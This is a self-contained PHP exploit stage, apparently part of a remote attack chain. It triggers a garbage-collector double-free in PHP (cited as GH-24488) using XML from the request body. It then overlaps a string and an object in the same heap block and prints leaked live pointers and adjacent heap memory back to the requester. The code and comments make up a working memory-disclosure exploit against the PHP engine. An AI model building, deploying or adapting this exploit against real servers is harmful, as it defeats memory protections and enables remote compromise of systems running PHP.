<?php
// r2_victim.php — LEAK stage, remote shape (one request, self-contained).
// GH-24488 GC double-free arms the bin-56 freelist with the SAME block
// twice. Alloc#1 = attacker-sized 31-char string (56B exact) -> block.
// Alloc#2 = new V (zend_object 40 + 1 prop slot 16 = 56B exact) -> SAME
// block: the object header overwrites the string header IN PLACE:
//   string.len (+16) := object.ce  (+16)  = REAL POINTER  -> strlen() huge
//   string.val (+24) := object+24.. = handlers/properties/prop0 = REAL PTRs
// substr($s1,0,N) then copies N bytes from val (engine permits: len=huge)
// -> bin2hex echoes LIVE OBJECT + ADJACENT HEAP bytes to the attacker.
header('Content-Type: text/plain');
class V { public $p; }
$xml = @simplexml_load_string(file_get_contents('php://input'));
if (!$xml) { echo "ERR-BADXML\n"; exit; }
get_object_vars($xml);
$w = new stdClass();
$w->x = $xml;
$w->self = $w;
unset($xml, $w);
gc_collect_cycles();                         // double-free fires (silent ZendMM)
$s1 = substr(str_repeat("T", 40), 0, 31);    // alloc#1: emalloc(56) exact
$o  = new V();                               // alloc#2: emalloc(56) = same block
$L  = strlen($s1);                           // = object.ce if the overlay hit
$D  = bin2hex(substr($s1, 0, 192));          // 192B read from val = object+24
echo "LEN=$L\n";
echo "HEX=$D\n";
echo "PID=" . getmypid() . "\n";
@ob_flush(); @flush();
